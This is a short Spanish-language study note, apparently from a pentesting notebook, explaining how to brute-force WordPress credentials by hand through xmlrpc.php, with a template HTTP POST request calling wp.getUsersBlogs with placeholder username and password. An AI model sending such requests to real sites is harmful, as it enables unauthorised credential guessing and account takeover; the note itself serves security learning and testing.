-----------------------
Tags: #web #scripting #bash #herramientas #wordpress 

----------------------------

Si quisiéramos aplicar fuerza bruta para descubrir credenciales válidas en [[Wordpress]] como haria [[Wpscan]] pero de forma manual, seria necesario hacer una petición POST al archivo **xmlrpc.php** tramitando una estructura XML:

```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>Usuario</value></param>
<param><value>Contraseña</value></param>
</params>
</methodCall>
```


